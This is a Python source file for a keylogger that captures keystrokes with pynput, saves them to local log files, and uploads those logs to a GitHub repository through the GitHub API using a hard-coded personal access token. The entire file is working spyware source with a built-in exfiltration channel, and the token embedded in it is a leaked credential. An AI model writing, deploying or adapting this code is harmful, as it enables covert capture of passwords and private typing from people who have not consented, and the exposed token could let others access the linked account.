import threading
from pynput.keyboard import Key, Listener
import os
from github import Github
import random
class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.timer = threading.Timer(20, self.stop_keylogger)
        self.listener = None
        self.teller = 0
        self.dir = "keylogs"
        self.access_token = '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'
        self.g = Github(self.access_token)
        self.user = self.g.get_user()
        self.repo = self.user.get_repo('python_development')

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))
        if self.count >= 15:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        file_name = f"logfile-{self.teller}"
        log_path = os.path.join(self.dir, file_name)
        with open(log_path, "a") as log:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    log.write('\n')
                elif k.find("Key") == -1:
                    log.write(k)

    def send_github(self):        
        file_name = f"logfile-{self.teller}"
        log_path = os.path.join(self.dir, file_name)
        with open(log_path, "rb") as file:
            self.repo.create_file(f"{self.dir}/{file_name}", "Added logfile", file.read())

    def on_release(self, key):
        if key == Key.esc:
            self.send_github()            
            self.timer.cancel()
            exit()
            return False

    def stop_keylogger(self):
        self.send_github()
        self.listener.stop()
        exit()


    def keylogger(self):
        self.teller = random.randint(0,10000000)
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.timer.start()        
        print(self.teller)
        self.listener.start()
        self.listener.join()

k = Keylogger()
k.keylogger()